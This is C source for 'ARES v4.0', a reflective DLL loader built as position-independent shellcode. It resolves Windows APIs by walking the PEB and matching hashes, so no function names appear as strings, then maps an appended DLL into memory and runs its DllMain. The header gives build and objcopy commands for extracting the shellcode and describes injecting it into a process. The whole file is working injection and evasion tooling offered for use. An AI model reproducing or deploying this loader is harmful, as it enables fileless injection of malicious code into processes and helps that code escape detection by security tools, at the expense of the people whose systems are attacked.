/*
 * ═══════════════════════════════════════════════════════════════
 *  ARES v4.0 — Reflective DLL Loader (Position-Independent)
 *
 *  This code runs as position-independent shellcode. When executed,
 *  it loads a DLL from memory without any file I/O:
 *
 *  1. Walk PEB → find kernel32.dll base address
 *  2. Parse kernel32 exports → find GetProcAddress + LoadLibraryA
 *  3. Use GetProcAddress to resolve VirtualAlloc, VirtualProtect, FlushInstructionCache
 *  4. Parse the appended DLL's PE headers
 *  5. Allocate memory at preferred base (or relocated)
 *  6. Copy PE sections to allocated memory
 *  7. Process base relocations (fix pointers for new base)
 *  8. Resolve imports (walk IAT, LoadLibrary each DLL, GetProcAddress each func)
 *  9. Finalize section permissions (RW→RX for .text, etc.)
 * 10. Call DllMain(hModule, DLL_PROCESS_ATTACH, NULL)
 *
 *  Compilation (to extract shellcode):
 *    gcc -nostdlib -nostartfiles -e ReflectiveLoader -fPIC -O2 -s \
 *        -Wl,--no-seh,--dynamicbase,--nxcompat \
 *        -o reflective_loader.exe reflective_loader.c -lkernel32
 *    objcopy -O binary -j .text reflective_loader.exe reflective_loader.bin
 *
 *  Usage with srdi_convert.py:
 *    The .bin shellcode is prepended to the DLL bytes.
 *    When injected into a process, execution starts at ReflectiveLoader.
 * ═══════════════════════════════════════════════════════════════
 */

#include <windows.h>

/* ── Hash-based API resolution (no string literals in shellcode) ── */

/* djb2 hash */
__attribute__((section(".text")))
static DWORD _hash(const char* str) {
    DWORD h = 5381;
    while (*str) {
        h = ((h << 5) + h) + (BYTE)*str++;
    }
    return h;
}

/* Pre-computed hashes (avoids string literals in .text) */
#define HASH_KERNEL32           0x6A4ABC5B  /* "KERNEL32.DLL" */
#define HASH_NTDLL              0x3CFA685D  /* "ntdll.dll" */
#define HASH_GETPROCADDRESS     0x7C0DFCAA  /* "GetProcAddress" */
#define HASH_LOADLIBRARYA       0xEC0E4E8E  /* "LoadLibraryA" */
#define HASH_VIRTUALALLOC       0x91AFCA54  /* "VirtualAlloc" */
#define HASH_VIRTUALPROTECT     0x7946C61B  /* "VirtualProtect" */
#define HASH_FLUSHICACHE        0xE15A5BD9  /* "FlushInstructionCache" */
#define HASH_GETCURRENTPROCESS  0x51D45637  /* "GetCurrentProcess" */

/* ── PEB Walk → Find Module Base by Hash ── */

__attribute__((section(".text")))
static HMODULE _find_module(DWORD name_hash) {
    /* GS:[0x60] = PEB on x64 */
#ifdef _WIN64
    PPEB peb = (PPEB)__readgsqword(0x60);
#else
    PPEB peb = (PPEB)__readfsdword(0x30);
#endif
    PLIST_ENTRY head = &peb->Ldr->InMemoryOrderModuleList;
    PLIST_ENTRY entry = head->Flink;

    while (entry != head) {
        PLDR_DATA_TABLE_ENTRY mod = CONTAINING_RECORD(entry, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);

        if (mod->FullDllName.Length > 0) {
            /* Hash the module name (uppercase) */
            DWORD h = 5381;
            WCHAR* name = mod->FullDllName.Buffer;
            /* Find last backslash to get base name */
            WCHAR* base_name = name;
            for (int i = 0; i < mod->FullDllName.Length / 2; i++) {
                if (name[i] == L'\\') base_name = &name[i + 1];
            }
            while (*base_name) {
                WCHAR c = *base_name++;
                if (c >= L'a' && c <= L'z') c -= 32; /* toupper */
                h = ((h << 5) + h) + (BYTE)c;
            }
            if (h == name_hash) {
                return (HMODULE)mod->DllBase;
            }
        }
        entry = entry->Flink;
    }
    return NULL;
}

/* ── Export Table Walk → Find Function by Hash ── */

__attribute__((section(".text")))
static FARPROC _find_export(HMODULE module, DWORD func_hash) {
    IMAGE_DOS_HEADER* dos = (IMAGE_DOS_HEADER*)module;
    IMAGE_NT_HEADERS* nt = (IMAGE_NT_HEADERS*)((BYTE*)module + dos->e_lfanew);
    IMAGE_EXPORT_DIRECTORY* exports = (IMAGE_EXPORT_DIRECTORY*)
        ((BYTE*)module + nt->OptionalHeader.DataDirectory[0].VirtualAddress);

    DWORD* names = (DWORD*)((BYTE*)module + exports->AddressOfNames);
    WORD* ordinals = (WORD*)((BYTE*)module + exports->AddressOfNameOrdinals);
    DWORD* functions = (DWORD*)((BYTE*)module + exports->AddressOfFunctions);

    for (DWORD i = 0; i < exports->NumberOfNames; i++) {
        const char* name = (const char*)((BYTE*)module + names[i]);
        if (_hash(name) == func_hash) {
            return (FARPROC)((BYTE*)module + functions[ordinals[i]]);
        }
    }
    return NULL;
}

/* ═══════════════════════════════════════════════════════════════
 *  REFLECTIVE LOADER — Entry Point
 *
 *  This function is the shellcode entry point.
 *  It finds its own location via call/pop, calculates the offset
 *  to the appended DLL, and loads it reflectively.
 * ═══════════════════════════════════════════════════════════════ */

typedef LPVOID (WINAPI *fn_VirtualAlloc)(LPVOID, SIZE_T, DWORD, DWORD);
typedef BOOL (WINAPI *fn_VirtualProtect)(LPVOID, SIZE_T, DWORD, PDWORD);
typedef BOOL (WINAPI *fn_FlushInstructionCache)(HANDLE, LPCVOID, SIZE_T);
typedef HANDLE (WINAPI *fn_GetCurrentProcess)(void);
typedef HMODULE (WINAPI *fn_LoadLibraryA)(LPCSTR);
typedef FARPROC (WINAPI *fn_GetProcAddress)(HMODULE, LPCSTR);
typedef BOOL (WINAPI *fn_DllMain)(HINSTANCE, DWORD, LPVOID);

__attribute__((section(".text")))
DWORD ReflectiveLoader(BYTE* dll_base) {
    /* ── Step 1: Resolve APIs from kernel32 ── */
    HMODULE k32 = _find_module(HASH_KERNEL32);
    if (!k32) return 0;

    fn_GetProcAddress pGetProcAddress = (fn_GetProcAddress)_find_export(k32, HASH_GETPROCADDRESS);
    fn_LoadLibraryA pLoadLibraryA = (fn_LoadLibraryA)_find_export(k32, HASH_LOADLIBRARYA);
    fn_VirtualAlloc pVirtualAlloc = (fn_VirtualAlloc)_find_export(k32, HASH_VIRTUALALLOC);
    fn_VirtualProtect pVirtualProtect = (fn_VirtualProtect)_find_export(k32, HASH_VIRTUALPROTECT);
    fn_FlushInstructionCache pFlushIC = (fn_FlushInstructionCache)_find_export(k32, HASH_FLUSHICACHE);
    fn_GetCurrentProcess pGetCurrentProcess = (fn_GetCurrentProcess)_find_export(k32, HASH_GETCURRENTPROCESS);

    if (!pGetProcAddress || !pLoadLibraryA || !pVirtualAlloc || !pVirtualProtect)
        return 0;

    /* ── Step 2: Parse appended DLL PE headers ── */
    IMAGE_DOS_HEADER* dos = (IMAGE_DOS_HEADER*)dll_base;
    if (dos->e_magic != 0x5A4D) return 0;

    IMAGE_NT_HEADERS* nt = (IMAGE_NT_HEADERS*)(dll_base + dos->e_lfanew);
    if (nt->Signature != 0x4550) return 0;

    DWORD image_size = nt->OptionalHeader.SizeOfImage;
    DWORD headers_size = nt->OptionalHeader.SizeOfHeaders;
    ULONGLONG preferred_base = nt->OptionalHeader.ImageBase;

    /* ── Step 3: Allocate memory for DLL ── */
    BYTE* new_base = (BYTE*)pVirtualAlloc(
        (LPVOID)preferred_base, image_size,
        MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);

    if (!new_base) {
        /* Preferred base unavailable — allocate anywhere */
        new_base = (BYTE*)pVirtualAlloc(
            NULL, image_size,
            MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
    }
    if (!new_base) return 0;

    /* ── Step 4: Copy headers ── */
    for (DWORD i = 0; i < headers_size; i++)
        new_base[i] = dll_base[i];

    /* ── Step 5: Copy sections ── */
    IMAGE_SECTION_HEADER* sections = IMAGE_FIRST_SECTION(nt);
    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        BYTE* dest = new_base + sections[i].VirtualAddress;
        BYTE* src = dll_base + sections[i].PointerToRawData;
        DWORD raw_size = sections[i].SizeOfRawData;

        for (DWORD j = 0; j < raw_size; j++)
            dest[j] = src[j];

        /* Zero-fill remainder if VirtualSize > SizeOfRawData */
        for (DWORD j = raw_size; j < sections[i].Misc.VirtualSize; j++)
            dest[j] = 0;
    }

    /* ── Step 6: Process base relocations ── */
    LONGLONG delta = (LONGLONG)((ULONGLONG)new_base - preferred_base);
    if (delta != 0) {
        IMAGE_DATA_DIRECTORY* reloc_dir = &nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
        if (reloc_dir->Size > 0) {
            IMAGE_BASE_RELOCATION* reloc = (IMAGE_BASE_RELOCATION*)(new_base + reloc_dir->VirtualAddress);
            while (reloc->VirtualAddress > 0) {
                DWORD count = (reloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
                WORD* entries = (WORD*)((BYTE*)reloc + sizeof(IMAGE_BASE_RELOCATION));

                for (DWORD i = 0; i < count; i++) {
                    WORD type = entries[i] >> 12;
                    WORD offset = entries[i] & 0x0FFF;

                    if (type == IMAGE_REL_BASED_DIR64) {
                        ULONGLONG* patch = (ULONGLONG*)(new_base + reloc->VirtualAddress + offset);
                        *patch += delta;
                    } else if (type == IMAGE_REL_BASED_HIGHLOW) {
                        DWORD* patch = (DWORD*)(new_base + reloc->VirtualAddress + offset);
                        *patch += (DWORD)delta;
                    }
                }
                reloc = (IMAGE_BASE_RELOCATION*)((BYTE*)reloc + reloc->SizeOfBlock);
            }
        }
    }

    /* ── Step 7: Resolve imports ── */
    IMAGE_DATA_DIRECTORY* import_dir = &nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
    if (import_dir->Size > 0) {
        IMAGE_IMPORT_DESCRIPTOR* imp = (IMAGE_IMPORT_DESCRIPTOR*)(new_base + import_dir->VirtualAddress);

        while (imp->Name) {
            const char* dll_name = (const char*)(new_base + imp->Name);
            HMODULE hMod = pLoadLibraryA(dll_name);

            if (hMod) {
                IMAGE_THUNK_DATA* thunk_ref = (IMAGE_THUNK_DATA*)(new_base +
                    (imp->OriginalFirstThunk ? imp->OriginalFirstThunk : imp->FirstThunk));
                IMAGE_THUNK_DATA* func_ref = (IMAGE_THUNK_DATA*)(new_base + imp->FirstThunk);

                while (thunk_ref->u1.AddressOfData) {
                    if (thunk_ref->u1.Ordinal & IMAGE_ORDINAL_FLAG64) {
                        /* Import by ordinal */
                        func_ref->u1.Function = (ULONGLONG)pGetProcAddress(
                            hMod, (LPCSTR)(thunk_ref->u1.Ordinal & 0xFFFF));
                    } else {
                        /* Import by name */
                        IMAGE_IMPORT_BY_NAME* ibn = (IMAGE_IMPORT_BY_NAME*)(new_base + thunk_ref->u1.AddressOfData);
                        func_ref->u1.Function = (ULONGLONG)pGetProcAddress(hMod, ibn->Name);
                    }
                    thunk_ref++;
                    func_ref++;
                }
            }
            imp++;
        }
    }

    /* ── Step 8: Finalize section permissions ── */
    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        DWORD protect = PAGE_READONLY;
        DWORD chars = sections[i].Characteristics;

        if (chars & IMAGE_SCN_MEM_EXECUTE) {
            if (chars & IMAGE_SCN_MEM_WRITE)
                protect = PAGE_EXECUTE_READWRITE;
            else
                protect = PAGE_EXECUTE_READ;
        } else if (chars & IMAGE_SCN_MEM_WRITE) {
            protect = PAGE_READWRITE;
        }

        DWORD old;
        DWORD sec_size = sections[i].Misc.VirtualSize;
        if (sec_size == 0) sec_size = sections[i].SizeOfRawData;
        pVirtualProtect(new_base + sections[i].VirtualAddress, sec_size, protect, &old);
    }

    /* ── Step 9: Flush instruction cache ── */
    if (pFlushIC && pGetCurrentProcess)
        pFlushIC(pGetCurrentProcess(), NULL, 0);

    /* ── Step 10: Call DllMain ── */
    fn_DllMain pDllMain = (fn_DllMain)(new_base + nt->OptionalHeader.AddressOfEntryPoint);
    pDllMain((HINSTANCE)new_base, DLL_PROCESS_ATTACH, NULL);

    return (DWORD)(ULONG_PTR)new_base;
}
